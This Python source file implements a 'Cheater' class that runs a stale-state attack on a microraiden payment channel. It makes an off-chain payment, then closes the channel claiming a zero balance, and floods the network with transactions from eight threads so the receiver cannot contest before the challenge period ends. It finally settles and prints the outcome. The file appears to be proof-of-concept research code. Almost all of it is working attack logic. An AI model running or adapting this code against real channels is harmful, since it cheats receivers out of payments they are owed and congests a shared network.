#!/usr/bin/python

import logging, datetime
import config as config
from spamming import SpamManager
from microraiden import Client
from utils import (
    send_payment,
    create_close_channel_transaction,
    create_settle_channel_transaction,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
)

class Cheater():
    def __init__(
        self,
        web3,
        private_key: str=config.PRIVATE_KEY,
        channel_manager_address: str=config.CHANNEL_MANAGER_ADDRESS,
        congestion_level: int=config.CONGESTION_LEVEL,
    ):
        self.web3 = web3
        self.private_key = private_key
        self.logger = logging.getLogger('cheater')

        # Initialize client
        self.client = Client(private_key=private_key, key_password_path=None, channel_manager_address=channel_manager_address)

        # Initialize spam manager
        self.spam_manager = SpamManager(
            web3=web3,
            private_key=private_key,
            number_threads=8,
            nonce_offset=1, # for close request
            congestion_level=congestion_level,
            create_settle_transaction=lambda nonce: self.create_settle_transaction(nonce),
        )
    
    def start(self):
        # Get an open channel
        self.channel = self.client.get_suitable_channel(
            receiver=self.web3.toChecksumAddress(config.RECEIVER_ADDRESS),
            value=1
        )

        # Wait for channel to be open
        opened_event = wait_for_open(channel=self.channel, confirmations=2)
        self.logger.info('Active channel: (sender={}, block={})'.format(self.channel.sender, self.channel.block))

        # Send an off-chain payment
        amount = 1
        self.channel.create_transfer(amount)
        send_payment(channel=self.channel, amount=amount)

        if (len(self.spam_manager.queued_transactions()) < config.MIN_QUEUED_TXS):
            self.logger.info('Waiting for full transaction queue ({} transactions)...'.format(config.MIN_QUEUED_TXS))
            self.spam_manager.wait_for_full_tx_queue()

        self.cheat_and_spam()
    
    def cheat_and_spam(self):
        '''
        Performs a stale state attack on the given channel. 
        Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
        and spams the network with transactions from the channel's sender account
        until the channel is settled or the challenge period is over. If the end of the challenge
        period is reached, a settle request is sent.
        '''
        # Create close channel transaction
        close_tx = create_close_channel_transaction(channel=self.channel, balance=0)

        # Send close channel transaction    
        self.logger.info('Sending close transaction...')
        self.web3.eth.sendRawTransaction(close_tx)

        # Start transaction spamming with 8 threads
        self.spam_manager.start()

        # Wait for channel to be closed
        closed_event = wait_for_close(self.channel)
        self.logger.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

        # Get block number when channel can be settled
        _, _, settle_block, _, _ = self.channel.core.channel_manager.call().getChannelInfo(
            self.channel.sender, self.channel.receiver, self.channel.block
        )
        # Update target block for spamming thread
        self.spam_manager.update_target_block(settle_block)
        
        # Wait for channel to be settled
        settled_event = wait_for_settle(self.channel)
        self.logger.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

        # Stop the spamming
        self.spam_manager.stop()

        # Get the settle transaction
        settle_tx_hash = settled_event['transactionHash']
        settle_tx = self.web3.eth.getTransaction(settle_tx_hash)

        # Extract some interesting information
        close_block = self.web3.eth.getBlock(closed_event['blockNumber'])
        settle_block = self.web3.eth.getBlock(settled_event['blockNumber'])
        elapsed_time = datetime.timedelta(seconds=settle_block['timestamp']-close_block['timestamp']) 

        # Determine, if sender or receiver settled the channel
        settled_by = settle_tx['from']
        if (settled_by == self.channel.receiver):
            settled_by = 'Receiver'
        if (settled_by == self.channel.core.address):
            settled_by = 'Sender'

        # Print result
        print()
        print('-----------------------------------------------------------')
        print('Sender \t\t {}'.format(self.channel.core.address))
        print('Receiver \t {}'.format(self.channel.receiver))
        # print('OPENED block \t #{}'.format(channel.block))
        # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
        # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
        print()
        print('Settled by \t\t {}'.format(settled_by))
        print('Settle balance \t\t {}'.format(settled_event['args']['_balance']))
        print('Spam transactions \t {}'.format(self.spam_manager.number_sent_transactions()))
        print('Elapsed time \t\t {}'.format(str(elapsed_time)))
        print('CLOSE->SETTLE \t\t {}'.format(settled_event['blockNumber']-closed_event['blockNumber']))
        print('-----------------------------------------------------------')
        print()

    def create_settle_transaction(self, nonce):
        return create_settle_channel_transaction(self.channel, nonce)